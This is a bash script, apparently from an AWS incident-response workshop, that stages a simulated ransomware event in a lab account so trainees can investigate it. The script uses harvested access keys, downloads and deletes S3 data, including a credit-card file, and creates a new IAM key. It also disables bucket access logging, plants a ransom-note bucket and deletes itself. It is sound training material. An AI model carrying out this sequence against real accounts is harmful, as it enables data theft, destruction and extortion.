# MIT No Attribution
# 
# Copyright 2023 AWS
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this
# software and associated documentation files (the "Software"), to deal in the Software
# without restriction, including without limitation the rights to use, copy, modify,
# merge, publish, distribute, sublicense, and/or sell copies of the Software, and to
# permit persons to whom the Software is furnished to do so.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
# INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A
# PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
# HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
# OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
# SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#
#!/bin/bash
#
# Export S3 bucket names
#
BUCKET01=$(aws resourcegroupstaggingapi get-resources --tag-filters Key=tdir-workshop-03,Values=sim-bucket-company-secrets --query 'ResourceTagMappingList[].ResourceARN' |jq -r ".[$bucket]" |cut -d":" -f 6)
BUCKET02=$(aws resourcegroupstaggingapi get-resources --tag-filters Key=tdir-workshop-03,Values=sim-bucket-exfiltration --query 'ResourceTagMappingList[].ResourceARN' |jq -r ".[$bucket]" |cut -d":" -f 6)
BUCKET03=$(aws resourcegroupstaggingapi get-resources --tag-filters Key=tdir-workshop-03,Values=sim-bucket-customer-data --query 'ResourceTagMappingList[].ResourceARN' |jq -r ".[$bucket]" |cut -d":" -f 6)
BUCKET_SAL=$(aws resourcegroupstaggingapi get-resources --tag-filters Key=tdir-workshop-02,Values=sim-buckets-server-access-logged --query 'ResourceTagMappingList[].ResourceARN' |jq -r ".[$bucket]" |cut -d":" -f 6)
#
#
# Create Users
#
echo "Creating 'temp-*' directory..."
RANSTRING=`cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-20} | head -n 1`
DIR=$(echo "temp-"$RANSTRING)
mkdir ${DIR}
cd ${DIR}
echo "Directory creation - complete."
echo "---"
echo "Starting Ransomware Security Event Simulation: Phase 1 of 5..."
JSTILES_AKID=$(aws cloudformation describe-stacks --query 'Stacks[*].Outputs[?OutputKey==`AccessKeyformyaccesskey`].OutputValue | [0] | [0]' | tr -d '"')
JSTILES_SECRET_AKID=$(aws cloudformation describe-stacks --query 'Stacks[*].Outputs[?OutputKey==`SecretKeyformyaccesskey`].OutputValue | [0] | [0]' | tr -d '"')
#
aws iam list-access-keys --user tdir-workshop-jstiles-dev > keycheck-step01-jsd.json
export GETKEY01JSD=$(jq -r '.AccessKeyMetadata' keycheck-step01-jsd.json)
while [ "${GETKEY01JSD}" = "[]" ]
do
  aws iam list-access-keys --user tdir-workshop-jstiles-dev > keycheck-step01-jsd.json
  export GETKEY01JSD=$(jq -r '.AccessKeyMetadata' keycheck-step01-jsd.json)
  echo "..."
  sleep 1
done
echo "---"
#
unset AWS_SESSION_TOKEN
export AWS_ACCESS_KEY_ID=${JSTILES_AKID}
export AWS_SECRET_ACCESS_KEY=${JSTILES_SECRET_AKID}
export AWS_DEFAULT_REGION=us-east-1
error=1
while [ ${error} -ne 0 ]
do
   aws sts get-caller-identity &> /dev/null
   error=${?}
   sleep 1
done
#
aws s3 ls > /dev/null
aws s3 ls > /dev/null
aws s3 ls > /dev/null
aws s3 ls s3://${BUCKET01}/ > /dev/null
#
aws s3 ls s3://${BUCKET02}/ > /dev/null
#
echo "Ransomware Security Event Simulation: Phase 1 of 5 - complete."
echo "---"
echo "Starting Ransomware Security Event Simulation: Phase 2 of 5..."
echo "---"
mkdir xlsx
cd xlsx
aws s3 cp s3://${BUCKET02}/ . --recursive > /dev/null
sleep 3
rm *.xlsx
aws s3 cp s3://${BUCKET02}/ . --recursive > /dev/null
sleep 3
rm *.xlsx
aws s3 cp s3://${BUCKET02}/ . --recursive > /dev/null
sleep 3
rm *.xlsx
cd ..
rmdir xlsx
aws s3 rm s3://${BUCKET02}/ --recursive > /dev/null
sleep 3
aws s3 ls s3://${BUCKET03}/backup/  > /dev/null
aws s3 ls s3://${BUCKET03}/backup/customers/  > /dev/null
aws s3 ls s3://${BUCKET03}/backup/customers/payment_information/  > /dev/null
aws s3 cp s3://${BUCKET03}/backup/customers/payment_information/credit-card-data.csv .  > /dev/null
aws s3 rm s3://${BUCKET03}/backup/customers/payment_information/credit-card-data.csv  > /dev/null
#
#
echo "Ransomware Security Event Simulation: Phase 2 of 5 - complete."
echo "---"
echo "Starting Ransomware Security Event Simulation: Phase 3 of 5..."
#
#
aws iam create-access-key --user-name tdir-workshop-rroe-dev > rrd.json
sleep 10
echo "---"
echo "Continuing Ransomware Security Event Simulation: Phase 3 of 5...."
sleep 10
echo "Continuing Ransomware Security Event Simulation: Phase 3 of 5....."
sleep 10
echo "Continuing Ransomware Security Event Simulation: Phase 3 of 5......"
sleep 10
echo "Continuing Ransomware Security Event Simulation: Phase 3 of 5......."
sleep 10
echo "Continuing Ransomware Security Event Simulation: Phase 3 of 5........"
#
unset AWS_SESSION_TOKEN
export AWS_ACCESS_KEY_ID=$(jq -r '.AccessKey.AccessKeyId' rrd.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r '.AccessKey.SecretAccessKey' rrd.json)
export AWS_DEFAULT_REGION=us-east-1
echo "---"
echo "Ransomware Security Event Simulation: Phase 3 of 5 - complete."
echo "---"
echo "Starting Ransomware Security Event Simulation: Phase 4 of 5..."
error=1
while [ ${error} -ne 0 ]
do
   aws sts get-caller-identity &> /dev/null
   error=${?}
   sleep 1
done
echo "{" > logging.json
echo "}" >> logging.json
aws s3api put-bucket-logging --bucket ${BUCKET_SAL} --bucket-logging-status file://logging.json
aws s3 ls > /dev/null
aws s3 ls > /dev/null
BUCKET05=$(echo "we-stole-ur-data-"$(uuidgen) | awk '{print tolower($0)}')
aws s3api create-bucket --bucket ${BUCKET05} --acl private > /dev/null
# aws s3api put-public-access-block --bucket ${BUCKET05} --public-access-block-configuration "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true" > /dev/null
aws s3api put-bucket-tagging --bucket ${BUCKET05} --tagging 'TagSet=[{Key=tdir-workshop-01,Value=all-sim-buckets}]'
#
touch all_your_data_are_belong_to_us.txt
echo 'We have deleted all your files and have taken your customer data including the CREDIT-CARD-DATA.CSV file containing the credit card numbers of EVERY SINGLE ONE of your 10 customers.' > all_your_data_are_belong_to_us.txt
echo '' >> all_your_data_are_belong_to_us.txt
echo 'Pay us 100 BILLION DOLLARS in bitcoin within 48 hours and we will return the file and promise not to leak it onto the dark web.' >> all_your_data_are_belong_to_us.txt
echo '' >> all_your_data_are_belong_to_us.txt
echo '' >> all_your_data_are_belong_to_us.txt
echo 'BTC Wallet address: <>' >> all_your_data_are_belong_to_us.txt
#
aws s3api put-object --bucket ${BUCKET05} --key all_your_data_are_belong_to_us.txt --body all_your_data_are_belong_to_us.txt > /dev/null
#
sleep 10
echo "---"
echo "Continuing Ransomware Security Event Simulation: Phase 4 of 5...."
sleep 10
echo "Continuing Ransomware Security Event Simulation: Phase 4 of 5....."
sleep 10
echo "Continuing Ransomware Security Event Simulation: Phase 4 of 5......"
sleep 10
echo "Continuing Ransomware Security Event Simulation: Phase 4 of 5......."
sleep 10
echo "Continuing Ransomware Security Event Simulation: Phase 4 of 5........"
echo "---"
echo "Ransomware Security Event Simulation: Phase 4 of 5 - complete."
echo "---"
echo "Starting Ransomware Security Event Simulation: Phase 5 of 5..."
#
unset AWS_SESSION_TOKEN
export AWS_ACCESS_KEY_ID=${JSTILES_AKID}
export AWS_SECRET_ACCESS_KEY=${JSTILES_SECRET_AKID}
export AWS_DEFAULT_REGION=us-east-1
error=1
while [ ${error} -ne 0 ]
do
   aws sts get-caller-identity &> /dev/null
   error=${?}
   sleep 1
done
#
aws iam delete-access-key --access-key-id $(jq -r '.AccessKey.AccessKeyId' rrd.json) --user-name tdir-workshop-rroe-dev > /dev/null
aws iam list-access-keys --user tdir-workshop-rroe-dev > keycheck-rrd.json
export GETKEYRRD=$(jq -r '.AccessKeyMetadata' keycheck-rrd.json)
while [ "${GETKEYRRD}" != "[]" ]
do
  aws iam list-access-keys --user tdir-workshop-rroe-dev > keycheck-rrd.json
  export GETKEYRRD=$(jq -r '.AccessKeyMetadata' keycheck-rrd.json)
  echo "..."
  sleep 1
done
echo "---"
#
unset AWS_SESSION_TOKEN
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_DEFAULT_REGION
error=1
while [ ${error} -ne 0 ]
do
   aws sts get-caller-identity &> /dev/null
   error=${?}
   sleep 1
done
#
rm all_your_data_are_belong_to_us.txt
rm credit-card-data.csv
rm *.json
cd ..
rm -rf ${DIR} 
echo "Ransomware Security Event Simulation: Phase 5 of 5 - complete."
echo "---"
echo "End of Simulation"
echo ""
echo "*******************************************************************************"
echo "*    SCENARIO: A strange Amazon S3 bucket has appeared in your AWS account.   *"
echo "*    Upon further investigation, the S3 bucket contains what appears to be    *"
echo "*    a ransom note!                                                           *"
echo "*                                                                             *"
echo "*    Use your AWS skills to determine the scope of any unauthorized use       *"
echo "*    and discover what data has been taken, and what data has been deleted.   *"
echo "*                                                                             *"
echo "*    There are questions at the beginning of each 'Detection' section of      *"
echo "*    this workshop that can be used to prompt your investigation if you get   *"
echo "*    stuck.  The end of each 'Detection' section will have hints and a        *"
echo "*    walkthrough to help provide answers to the questions.                    *" 
echo "*                                                                             *" 
echo "*    Good luck!                                                               *" 
echo "*                                                                             *" 
echo "*******************************************************************************"
rm -- "$0"





















